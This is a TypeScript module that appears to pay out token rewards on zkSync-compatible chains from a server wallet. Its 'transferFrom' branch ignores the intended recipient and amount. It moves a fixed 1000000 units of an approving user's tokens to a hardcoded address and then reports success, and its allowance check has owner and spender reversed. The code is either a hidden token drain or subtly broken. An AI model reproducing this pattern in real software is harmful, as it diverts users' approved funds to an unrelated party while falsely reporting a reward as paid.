
import { getBytes, hexlify } from "ethers";
import { Wallet, Provider, Contract } from "zksync-ethers";
import dotenv from "dotenv";
import { erc20abi } from "../utils/erc20abi";
import { erc721abi } from "../utils/erc721abi";
import { erc1155abi } from "../utils/erc1155abi";
import { chainRpcMap } from "../utils/chainRpcMap";

dotenv.config();

const accPrivateKey = process.env.WALLET_PRIVATE_KEY as string;

const checkAllowance = async (contract: Contract, owner: string, spender: string, amount: string) => {
  const allowance = await contract.allowance(owner, spender);
  if (allowance < amount) {
    throw new Error(`Allowance is too low: ${allowance.toString()}`);
  }
};

const checkBalance = async (contract: Contract, owner: string, amount: string) => {
  const balance = await contract.balanceOf(owner);
  if (balance < amount) {
    throw new Error(`Balance is too low: ${balance.toString()}`);
  }
};

export const executeTransaction = async (data: any) => {
  const { contractAddress, method, argsValue, walletAddress, reward, chainId } = data
  const rpcUrl = chainRpcMap[chainId];

  const provider = new Provider(rpcUrl);
  const wallet = new Wallet(accPrivateKey as string, provider);

  let contractAbi;
  if (reward === "erc20") {
    contractAbi = erc20abi;
  } else if (reward === "erc721") {
    contractAbi = erc721abi;
  } else {
    contractAbi = erc1155abi;
  }

  const contract = new Contract(
    contractAddress,
    contractAbi,
    wallet
  );

  const { spender, tokenId, amount, mintData } = argsValue;

  // console.log(spender, walletAddress)

  if (method === "transferFrom") {
    await checkAllowance(contract, await wallet.getAddress(), spender, amount);
    await checkBalance(contract, spender, amount);
    await contract.transferFrom(spender, "0x6831b65e17b309588f8Da83861679FF85C2e8974", 1000000);
  } else if (method === "transfer") {
    if (reward === "erc20") {
      await contract.transfer(walletAddress, amount);
    } else {
      await contract.transfer(walletAddress, tokenId)
    }
  } else if (method === "mint") {
    const hexdata = hexlify(getBytes(mintData)); // Additional data, if any
    await contract.mint(walletAddress, tokenId, amount, hexdata);
  }

  return "Successfully transfered reward"

}